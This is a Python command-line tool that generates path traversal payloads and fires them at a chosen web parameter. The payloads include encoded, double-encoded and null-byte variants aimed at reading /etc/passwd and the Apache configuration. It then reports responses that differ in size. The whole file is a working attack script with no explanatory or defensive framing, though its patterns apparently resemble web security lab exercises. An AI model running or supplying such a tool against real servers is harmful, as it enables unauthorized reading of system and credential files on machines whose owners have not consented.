import argparse
import requests
from urllib.parse import urlencode

def get_args():
    parser = argparse.ArgumentParser()
    args_group = parser.add_argument_group("Generic", "Generic options")
    args_group.add_argument("--target", type=str, help="", required=True)
    args_group.add_argument("--path", type=str, help="", required=True)
    args_group.add_argument("--param", type=str, help="", required=True)
    args_group.add_argument("--depth", type=int, default=4, help="")
    args_group.add_argument("--fs", type=lambda s: list(map(int, s.split(','))), help="")

    return parser.parse_args()


def generate_wordlist(depth):
    result = []
    single_options = ["/"]
    path_traversal_options = ["../", "....//", r"....\/", r"%2e%2e%2f", r"%252e%252e%252f", r"..%c0%af", r"..%ef%bc%8f"]
    targets_files = ["etc/passwd", "etc/apache2/apache2.conf"]
    common_directories_filter = ["/var/www/images/"]
    web_extensions = ["png"]
    special_suffix = [r"%00"]

    null_byte_suffixes = [s + '.' + ext for s in special_suffix for ext in web_extensions]

    for d in range(1, depth + 1):
        for target in targets_files:
            if d == 1:
                for s in single_options:
                    payloads = [s + target]

                    for p in payloads[:]:
                        for suffix in null_byte_suffixes:
                            payloads.append(p + suffix)

                    for payload in payloads:
                        result.append(payload)
                        for prefix in common_directories_filter:
                            result.append(prefix + payload)

            for option in path_traversal_options: 
                traversal = option * d
                payloads = [traversal + target]

                for p in payloads[:]:
                    for suffix in null_byte_suffixes:
                        payloads.append(p + suffix)

                for payload in payloads:
                    result.append(payload)
                    for prefix in common_directories_filter:
                        result.append(prefix + payload)

    return result


def run_attack(args, wordlist):
    results = []
    print("[+] Executing...")

    base_url = args.target.rstrip('/') + '/' + args.path.lstrip('/')

    for payload in wordlist:
        params = {args.param: payload}
        query_string = urlencode(params, quote_via=lambda x, safe='', encoding=None, errors=None: x)
        full_url = f"{base_url}?{query_string}"
        
        try:
            response = requests.get(full_url, timeout=5)
            if args.fs is None or len(response.text) not in args.fs:
                results.append({
                    'url': response.url,
                    'status_code': response.status_code,
                    'payload': payload,
                    'content_length': len(response.text)
                })
                print(f"[+] Found: [Size: {len(response.text)}, Payload: {payload}, URL: {response.url}]")
        except requests.RequestException as e:
            results.append({
                'url': base_url,
                'payload': payload,
                'error': str(e)
            })

    print("\r[+] Execution completed.   ")

    return results


def main():
    args = get_args()
    print(args)

    wordlist = generate_wordlist(args.depth)

    findings = run_attack(args, wordlist)


if __name__ == "__main__":
    main()